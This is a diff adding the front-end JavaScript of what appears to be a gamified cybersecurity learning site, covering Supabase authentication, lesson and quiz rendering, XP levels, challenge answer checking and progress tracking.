+let quizState = { current:0, answers:[], score:0 };
+
+// ══════════════════════════════════════════════
+// SUPABASE AUTH
+// ══════════════════════════════════════════════
+async function sbAuth(path, body) {
+  const res = await fetch(SB_URL+'/auth/v1'+path, {
+    method:'POST',
+    headers:{'apikey':SB_KEY,'Content-Type':'application/json'},
+    body:JSON.stringify(body)
+  });
+  const data = await res.json();
+  if(!res.ok) throw new Error(data.error_description||data.msg||'Auth error');
+  return data;
+}
+
+async function sbSaveProgress() {
+  if(!currentUser) return;
+  await fetch(SB_URL+'/rest/v1/cyberlearn_progress', {
+    method:'POST',
+    headers:{
+      'apikey':SB_KEY,'Authorization':'Bearer '+currentUser.access_token,
+      'Content-Type':'application/json','Prefer':'resolution=merge-duplicates'
+    },
+    body:JSON.stringify({user_id:currentUser.id, progress:JSON.stringify(userProgress)})
+  });
+}
+
+async function sbLoadProgress() {
+  if(!currentUser) return;
+  const res = await fetch(SB_URL+'/rest/v1/cyberlearn_progress?user_id=eq.'+currentUser.id, {
+    headers:{'apikey':SB_KEY,'Authorization':'Bearer '+currentUser.access_token}
+  });
+  const data = await res.json();
+  if(data && data.length>0 && data[0].progress) {
+    userProgress = JSON.parse(data[0].progress);
+  }
+}
+
+// ══════════════════════════════════════════════
+// AUTH FUNCTIONS
+// ══════════════════════════════════════════════
+function showAuthTab(tab) {
+  document.querySelectorAll('.auth-tab').forEach((t,i)=>{
+    t.classList.toggle('active',['login','signup','reset'][i]===tab);
+  });
+  document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById('panel-'+tab).classList.add('active');
+}
+
+async function doLogin() {
+  const email=document.getElementById('l-email').value.trim();
+  const pw=document.getElementById('l-pw').value;
+  const errEl=document.getElementById('l-err');
+  const btn=document.getElementById('l-btn');
+  errEl.textContent='';
+  if(!email||!pw){errEl.textContent='Please enter email and password.';return;}
+  btn.disabled=true;btn.textContent='Signing in…';
+  try{
+    const data=await sbAuth('/token?grant_type=password',{email,password:pw});
+    currentUser={...data.user,access_token:data.access_token};
+    await sbLoadProgress();
+    onLoginSuccess();
+  }catch(e){errEl.textContent='✕ '+(e.message==='Invalid login credentials'?'Incorrect email or password.':e.message);}
+  btn.disabled=false;btn.textContent='→ Sign In';
+}
+
+async function doSignup() {
+  const name=document.getElementById('s-name').value.trim();
+  const email=document.getElementById('s-email').value.trim();
+  const pw=document.getElementById('s-pw').value;
+  const pw2=document.getElementById('s-pw2').value;
+  const errEl=document.getElementById('s-err');
+  const okEl=document.getElementById('s-ok');
+  const btn=document.getElementById('s-btn');
+  errEl.textContent='';okEl.textContent='';
+  if(!name){errEl.textContent='Please enter your name.';return;}
+  if(pw.length<8){errEl.textContent='Password must be at least 8 characters.';return;}
+  if(pw!==pw2){errEl.textContent='Passwords do not match.';return;}
+  btn.disabled=true;btn.textContent='Creating account…';
+  try{
+    await sbAuth('/signup',{email,password:pw,data:{full_name:name}});
+    okEl.textContent='✅ Account created! Check your email to verify, then sign in.';
+  }catch(e){errEl.textContent='✕ '+e.message;}
+  btn.disabled=false;btn.textContent='→ Create Account';
+}
+
+async function doReset() {
+  const email=document.getElementById('r-email').value.trim();
+  const errEl=document.getElementById('r-err');
+  const okEl=document.getElementById('r-ok');
+  const btn=document.getElementById('r-btn');
+  errEl.textContent='';okEl.textContent='';
+  if(!email){errEl.textContent='Please enter your email.';return;}
+  btn.disabled=true;btn.textContent='Sending…';
+  try{
+    await fetch(SB_URL+'/auth/v1/recover',{method:'POST',headers:{'apikey':SB_KEY,'Content-Type':'application/json'},body:JSON.stringify({email})});
+    okEl.textContent='✅ Reset link sent to '+email;
+  }catch(e){errEl.textContent='✕ Could not send reset email.';}
+  btn.disabled=false;btn.textContent='→ Send Reset Link';
+}
+
+function doLogout() {
+  currentUser=null;
+  userProgress={xp:0,completedLessons:[],passedQuizzes:[],solvedChallenges:[],level:0};
+  document.getElementById('authScreen').classList.remove('hidden');
+  document.getElementById('l-email').value='';
+  document.getElementById('l-pw').value='';
+  switchPage('dashboard');
+}
+
+function onLoginSuccess() {
+  const name=currentUser.user_metadata?.full_name||currentUser.email?.split('@')[0]||'Hacker';
+  const initials=name.split(' ').map(n=>n[0]).join('').toUpperCase().slice(0,2);
+  document.getElementById('topAvatar').textContent=initials;
+  document.getElementById('topName').textContent=name.split(' ')[0];
+  document.getElementById('dashName').textContent=name.split(' ')[0];
+  document.getElementById('authScreen').classList.add('hidden');
+  updateXP();
+  renderDashboard();
+  renderChallenges();
+  renderProgress();
+  hideLoading();
+}
+
+// ══════════════════════════════════════════════
+// XP & LEVEL SYSTEM
+// ══════════════════════════════════════════════
+function addXP(amount) {
+  userProgress.xp += amount;
+  userProgress.level = Math.floor(userProgress.xp / 200);
+  updateXP();
+  sbSaveProgress();
+}
+
+function updateXP() {
+  const xp=userProgress.xp;
+  const level=userProgress.level;
+  const nextLevel=(level+1)*200;
+  const progress=((xp%200)/200)*100;
+  document.getElementById('xpLabel').textContent=xp+' XP';
+  document.getElementById('xpFill').style.width=progress+'%';
+  document.getElementById('levelBadge').textContent='LVL '+level;
+  document.getElementById('pr-xp').textContent=xp;
+  document.getElementById('pr-level').textContent=level;
+  document.getElementById('st-xp').textContent=xp;
+}
+
+// ══════════════════════════════════════════════
+// PAGE SWITCHING
+// ══════════════════════════════════════════════
+function switchPage(page) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const target=document.getElementById('page-'+page);
+  if(target) target.classList.add('active');
+  const navItem=document.querySelector(`.nav-item[data-page="${page}"]`);
+  if(navItem) navItem.classList.add('active');
+  if(page==='progress') renderProgress();
+}
+
+// ══════════════════════════════════════════════
+// DASHBOARD
+// ══════════════════════════════════════════════
+function renderDashboard() {
+  const completed=MODULES.filter(m=>m.lessons.every(l=>userProgress.completedLessons.includes(l.id))).length;
+  document.getElementById('st-modules').textContent=completed+'/'+MODULES.length;
+  document.getElementById('st-quizzes').textContent=userProgress.passedQuizzes.length;
+  document.getElementById('st-challenges').textContent=userProgress.solvedChallenges.length;
+
+  document.getElementById('modulesGrid').innerHTML=MODULES.map((m,i)=>{
+    const totalLessons=m.lessons.length;
+    const doneLessons=m.lessons.filter(l=>userProgress.completedLessons.includes(l.id)).length;
+    const pct=Math.round(doneLessons/totalLessons*100);
+    const isDone=pct===100;
+    const statusClass=isDone?'ms-done':'ms-new';
+    const statusText=isDone?'COMPLETE':'START';
+    return `<div class="module-card ${isDone?'completed':''}" onclick="openModule(${i})">
+      <div class="module-top">
+        <div class="module-icon">${m.icon}</div>
+        <div class="module-title">${m.title}</div>
+        <div class="module-desc">${m.desc}</div>
+        <div class="module-progress"><div class="module-progress-fill" style="width:${pct}%"></div></div>
+      </div>
+      <div class="module-bottom">
+        <div class="module-meta">${totalLessons} lesson${totalLessons!==1?'s':''} · ${pct}% done</div>
+        <div class="module-status ${statusClass}">${statusText}</div>
+      </div>
+    </div>`;
+  }).join('');
+
+  // Update nav badges
+  MODULES.forEach((m,i)=>{
+    const nb=document.getElementById('nb'+i);
+    if(!nb) return;
+    const done=m.lessons.every(l=>userProgress.completedLessons.includes(l.id));
+    nb.textContent=done?'✓':'NEW';
+    nb.className='nav-badge '+(done?'done':'');
+  });
+}
+
+// ══════════════════════════════════════════════
+// MODULE / LESSON
+// ══════════════════════════════════════════════
+function openModule(idx) {
+  currentModule=idx;
+  currentLessonIdx=0;
+  currentSection='lesson';
+  switchPage('module');
+  renderLesson();
+}
+
+function renderLesson() {
+  const mod=MODULES[currentModule];
+  const lesson=mod.lessons[currentLessonIdx];
+  document.getElementById('lessonModuleTitle').textContent=mod.title;
+  document.getElementById('lessonTitle').textContent=lesson.title;
+
+  // Nav list
+  document.getElementById('lessonNavList').innerHTML=mod.lessons.map((l,i)=>{
+    const done=userProgress.completedLessons.includes(l.id);
+    const active=i===currentLessonIdx;
+    return `<div class="lesson-nav-item ${done?'done':''} ${active?'active':''}" onclick="jumpLesson(${i})">
+      <div class="lesson-check ${done?'done':''} ${active&&!done?'active':''}">
+        ${done?'✓':i+1}
+      </div>
+      ${l.title}
+    </div>`;
+  }).join('');
+
+  // Main content
+  if(currentSection==='lesson') {
+    document.getElementById('lessonMain').innerHTML=`
+      <div class="lesson-card">
+        <div class="lesson-card-head">📖 Lesson Content</div>
+        <div class="lesson-card-body">${lesson.content}</div>
+      </div>
+      ${lesson.video?`
+      <div class="lesson-card">
+        <div class="lesson-card-head">🎥 Video Lesson</div>
+        <div class="lesson-card-body">
+          <div class="video-wrap">
+            <iframe src="${lesson.video}" frameborder="0" allowfullscreen></iframe>
+          </div>
+        </div>
+      </div>`:''}
+      <div style="display:flex;justify-content:flex-end;gap:.75rem;padding:.5rem 0;">
+        <button class="btn btn-primary" onclick="startQuiz()">Take Quiz →</button>
+      </div>`;
+    document.getElementById('nextLessonBtn').textContent='Take Quiz →';
+    document.getElementById('nextLessonBtn').onclick=startQuiz;
+  }
+}
+
+function jumpLesson(idx) {
+  currentLessonIdx=idx;
+  currentSection='lesson';
+  renderLesson();
+}
+
+function nextLesson() { startQuiz(); }
+
+// ══════════════════════════════════════════════
+// QUIZ
+// ══════════════════════════════════════════════
+function startQuiz() {
+  currentSection='quiz';
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  quizState={current:0,answers:[],score:0,wrongAnswers:[]};
+  renderQuizQuestion(lesson.quiz);
+  document.getElementById('nextLessonBtn').textContent='Back to Lesson';
+  document.getElementById('nextLessonBtn').onclick=()=>{currentSection='lesson';renderLesson();};
+}
+
+function renderQuizQuestion(questions) {
+  const q=questions[quizState.current];
+  const letters=['A','B','C','D'];
+  const isTrick=q.trick;
+  document.getElementById('lessonMain').innerHTML=`
+    <div class="quiz-wrap">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;">
+        <div class="quiz-progress" style="margin-bottom:0">
+          ${questions.map((_,i)=>`<div class="qp-dot ${i<quizState.current?'done':i===quizState.current?'active':''}"></div>`).join('')}
+        </div>
+        <div style="font-size:.72rem;color:var(--muted);font-family:'Space Mono',monospace;">${quizState.current+1}/${questions.length} · Need 90% to pass</div>
+      </div>
+      ${isTrick?`<div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);border-radius:6px;padding:.4rem .75rem;font-size:.72rem;color:var(--yellow);margin-bottom:.75rem;display:flex;align-items:center;gap:.4rem;">⚠️ TRICK QUESTION — Read carefully!</div>`:''}
+      <div class="quiz-q">
+        <span class="qnum">Question ${quizState.current+1} of ${questions.length}</span>
+        ${q.q}
+      </div>
+      <div class="quiz-options">
+        ${q.opts.map((opt,i)=>`
+          <div class="quiz-opt" id="qo${i}" onclick="selectAnswer(${i},${q.correct},${quizState.current},${questions.length})">
+            <div class="quiz-opt-letter">${letters[i]}</div>
+            ${opt}
+          </div>`).join('')}
+      </div>
+      <div class="quiz-feedback" id="quizFeedback"></div>
+    </div>`;
+}
+
+function selectAnswer(idx, correct, qIdx, total) {
+  document.querySelectorAll('.quiz-opt').forEach(o=>o.onclick=null);
+  const isCorrect=idx===correct;
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  const q=lesson.quiz[qIdx];
+  if(isCorrect) quizState.score++;
+  else quizState.wrongAnswers.push({question:q.q, yourAnswer:q.opts[idx], correctAnswer:q.opts[correct], explanation:q.exp, trick:q.trick});
+  quizState.answers.push({idx,correct,isCorrect});
+  document.querySelectorAll('.quiz-opt').forEach((o,i)=>{
+    if(i===correct) o.classList.add('correct');
+    else if(i===idx&&!isCorrect) o.classList.add('wrong');
+  });
+  const fb=document.getElementById('quizFeedback');
+  fb.className='quiz-feedback show '+(isCorrect?'correct':'wrong');
+  fb.innerHTML=(isCorrect?'✅ Correct! ':'❌ Wrong. ')+q.exp+
+    `<div style="margin-top:.75rem;display:flex;justify-content:flex-end">
+      <button class="btn btn-primary btn-sm" onclick="${quizState.current+1<total?'nextQuestion('+total+')':'showQuizResult('+total+')'}">
+        ${quizState.current+1<total?'Next Question →':'See Results'}
+      </button>
+    </div>`;
+}
+
+function nextQuestion(total) {
+  quizState.current++;
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  renderQuizQuestion(lesson.quiz);
+}
+
+function showQuizResult(total) {
+  const score=quizState.score;
+  const pct=Math.round(score/total*100);
+  const pass=pct>=90;
+  const lessonId=MODULES[currentModule].lessons[currentLessonIdx].id;
+  const xpEarned=pass?150:0;
+
+  if(pass&&!userProgress.passedQuizzes.includes(lessonId)){
+    userProgress.passedQuizzes.push(lessonId);
+    addXP(xpEarned);
+    sbSaveProgress();
+  }
+
+  const wrongHTML=quizState.wrongAnswers.length>0?`
+    <div style="text-align:left;margin-top:1.5rem;">
+      <div style="font-family:'Space Mono',monospace;font-size:.8rem;color:var(--accent);margin-bottom:.85rem;">
+        ${pass?'📝 Review your mistakes:':'📝 Concepts to review before retaking:'}
+      </div>
+      ${quizState.wrongAnswers.map((w,i)=>`
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:.85rem 1rem;margin-bottom:.65rem;border-left:3px solid var(--red);">
+          ${w.trick?`<div style="font-size:.65rem;color:var(--yellow);font-weight:700;margin-bottom:.3rem;">⚠️ TRICK QUESTION</div>`:''}
+          <div style="font-size:.8rem;font-weight:700;margin-bottom:.4rem;color:var(--text);">Q${i+1}: ${w.question}</div>
+          <div style="font-size:.75rem;color:var(--red);margin-bottom:.2rem;">✗ Your answer: ${w.yourAnswer}</div>
+          <div style="font-size:.75rem;color:var(--green);margin-bottom:.4rem;">✓ Correct: ${w.correctAnswer}</div>
+          <div style="font-size:.75rem;color:var(--muted);line-height:1.5;">${w.explanation}</div>
+        </div>`).join('')}
+    </div>`:'';
+
+  document.getElementById('lessonMain').innerHTML=`
+    <div class="quiz-wrap">
+      <div class="quiz-result">
+        <div style="font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);margin-bottom:.5rem;">QUIZ RESULT</div>
+        <div class="score ${pass?'pass':'fail'}">${pct}%</div>
+        <div style="font-size:.82rem;color:var(--muted);margin-bottom:.35rem;">${score} correct out of ${total} questions</div>
+        <div style="font-weight:700;font-size:1.1rem;margin-bottom:.5rem;color:${pass?'var(--green)':'var(--red)'}">
+          ${pass?'🎉 Passed!':'❌ Not passed — 90% required'}
+        </div>
+        <div style="font-size:.82rem;color:var(--muted);margin-bottom:1.25rem;">
+          ${pass
+            ?`You earned <strong style="color:var(--accent)">${xpEarned} XP</strong>! Excellent work.`
+            :`You scored ${pct}% but need <strong style="color:var(--accent)">90%</strong> to continue. Review the concepts below, then retake.`
+          }
+        </div>
+        ${wrongHTML}
+        <div style="display:flex;gap:.75rem;justify-content:center;flex-wrap:wrap;margin-top:1.25rem;">
+          <button class="btn btn-ghost" onclick="currentSection='lesson';renderLesson()">📖 Review Lesson</button>
+          <button class="btn btn-secondary" onclick="startQuiz()">↩ Retake Quiz</button>
+          ${pass?`<button class="btn btn-primary" onclick="completeLesson(true)">Next Lesson →</button>`:''}
+        </div>
+      </div>
+    </div>`;
+}
+
+function completeLesson(advance) {
+  const lesson=MODULES[currentModule].lessons[currentLessonIdx];
+  if(!userProgress.completedLessons.includes(lesson.id)) {
+    userProgress.completedLessons.push(lesson.id);
+    addXP(50);
+  }
+  sbSaveProgress();
+  if(advance&&currentLessonIdx<MODULES[currentModule].lessons.length-1) {
+    currentLessonIdx++;
+    currentSection='lesson';
+    renderLesson();
+  } else {
+    renderDashboard();
+    switchPage('dashboard');
+  }
+}
+
+// ══════════════════════════════════════════════
+// CHALLENGES
+// ══════════════════════════════════════════════
+function renderChallenges() {
+  document.getElementById('challengesList').innerHTML=CHALLENGES.map(c=>{
+    const solved=userProgress.solvedChallenges.includes(c.id);
+    const diffClass={'easy':'diff-easy','medium':'diff-medium','hard':'diff-hard'}[c.diff];
+    return `<div class="challenge-card">
+      <div class="challenge-title">${c.title} ${solved?'<span style="color:var(--green);font-size:.75rem">✓ SOLVED</span>':''}</div>
+      <div class="diff-badge ${diffClass}">${c.diff}</div>
+      <div style="font-size:.72rem;color:var(--muted);margin-bottom:.5rem;">Module: ${c.module} · +${c.xp} XP</div>
+      <div class="challenge-desc">${c.desc.replace(/\n/g,'<br>')}</div>
+      ${c.code?`<div class="code-block">${c.code}</div>`:''}
+      <div class="challenge-hint" onclick="toggleHint('h${c.id}')">💡 Show Hint</div>
+      <div class="challenge-hint-text" id="h${c.id}">${c.hint}</div>
+      ${!solved?`
+        <input class="challenge-input" id="ci${c.id}" placeholder="Enter your answer…" onkeydown="if(event.key==='Enter')checkChallenge('${c.id}')">
+        <button class="btn btn-primary btn-sm" onclick="checkChallenge('${c.id}')">Submit Answer</button>
+        <div style="min-height:1.2rem;margin-top:.5rem;font-size:.78rem;" id="cr${c.id}"></div>
+      `:`<div style="color:var(--green);font-size:.82rem;margin-top:.5rem;">✅ You solved this challenge!</div>`}
+    </div>`;
+  }).join('');
+}
+
+function toggleHint(id) {
+  const el=document.getElementById(id);
+  el.classList.toggle('show');
+}
+
+function checkChallenge(id) {
+  const c=CHALLENGES.find(x=>x.id===id);
+  const input=document.getElementById('ci'+id).value.trim();
+  const result=document.getElementById('cr'+id);
+  if(input.toLowerCase()===c.answer.toLowerCase()) {
+    if(!userProgress.solvedChallenges.includes(id)) {
+      userProgress.solvedChallenges.push(id);
+      addXP(c.xp);
+      sbSaveProgress();
+    }
+    document.getElementById('st-challenges').textContent=userProgress.solvedChallenges.length;
+    renderChallenges();
+  } else {
+    result.style.color='var(--red)';
+    result.textContent='✕ Incorrect. Try again!';
+  }
+}
+
+// ══════════════════════════════════════════════
+// PROGRESS PAGE
+// ══════════════════════════════════════════════
+function renderProgress() {
+  document.getElementById('pr-quizzes').textContent=userProgress.passedQuizzes.length;
+  document.getElementById('pr-challenges').textContent=userProgress.solvedChallenges.length;
+  document.getElementById('progressModules').innerHTML=MODULES.map(m=>{
+    const total=m.lessons.length;
+    const done=m.lessons.filter(l=>userProgress.completedLessons.includes(l.id)).length;
+    const pct=Math.round(done/total*100);
+    return `<div class="progress-module">
+      <div class="progress-module-icon">${m.icon}</div>
+      <div class="progress-module-info">
+        <div class="progress-module-name">${m.title}</div>
+        <div class="progress-bar"><div class="progress-fill" style="width:${pct}%"></div></div>
+      </div>
+      <div class="progress-pct">${pct}%</div>
+    </div>`;
+  }).join('');
+}
+
+// ══════════════════════════════════════════════
+// LOADING
+// ══════════════════════════════════════════════
+function hideLoading() { document.getElementById('loadingOverlay').classList.add('hidden'); }
+
+// ══════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════
+setTimeout(hideLoading, 800);
+</script>
+</body>
+</html>
